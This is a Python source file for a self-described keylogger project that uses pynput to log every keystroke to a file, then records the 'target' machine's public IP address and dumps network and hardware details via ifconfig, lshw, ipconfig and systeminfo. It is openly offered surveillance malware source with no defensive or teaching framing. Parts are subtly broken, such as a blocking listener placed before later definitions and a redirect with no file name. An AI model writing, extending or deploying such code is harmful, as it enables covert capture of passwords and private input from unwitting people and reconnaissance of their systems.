# keylogger project

#importing modules.
import os
import sys
from pynput import keyboard
import requests
import re

def keyboard_input(key_value):
    file = open('keyspy.txt','a')
    file.write(f'{key_value} \n')

def systeminfo(data):
    file = open('systeminfo.txt','a')
    file.write(data)

#function for pressing a key.
def on_press(key):
    try:
        print(f'User pressed the key \033[32m"{key.char}"\033[0m.')
        keyboard_input(key)
    except:
        print(f'Special \033[32m"{key}"\033[0m is pressed.')
        keyboard_input(key)

#function for key releasing.
def on_release(key):
    #for printing when the key is released.
    print(f'key \033[33m{key}\033[0m  is released.')
    #condition returns false and stops recording the keystrokes.
    if key == keyboard.Key.esc:
        return False



#block for listening the keyboard inputs.
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



def ip_information():

    ip = str(requests.get('http://checkip.dyndns.com/').text)
    value =  re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(ip).group(1)
    ip_value = f"[*] Target Ip Address: '{value}'."
    systeminfo(ip_value)

def linux_system():

    os.system('ifconfig > ipinfo.txt')
    os.system('lshw > hardwareinfo.txt')

def windows_system():

    os.system('ipconfig > ipinfo.txt')
    os.system('systeminfo > ')

def main():

    ip_addr = ip_information()
    os_platform = sys.platform
    if os_platform == "linux":
        linux_system()
    else:
        windows_system()
    

main()

